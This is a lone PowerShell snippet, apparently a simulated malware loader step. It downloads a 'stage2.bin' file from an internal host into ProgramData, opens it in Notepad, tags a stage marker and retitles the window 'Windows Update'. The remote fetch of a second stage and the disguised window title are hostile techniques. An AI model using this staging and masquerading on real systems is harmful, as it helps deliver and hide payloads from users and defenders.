
try { Invoke-WebRequest -Uri "http://internal.corp/update.dat" -OutFile 'C:\ProgramData\stage2.bin' -UseBasicParsing; Start-Process -FilePath "notepad.exe" -ArgumentList 'C:\ProgramData\stage2.bin'; $StageMarker = "stage-24"; $Host.UI.RawUI.WindowTitle = "Windows Update" } catch { Write-Warning "Loader step failed" }
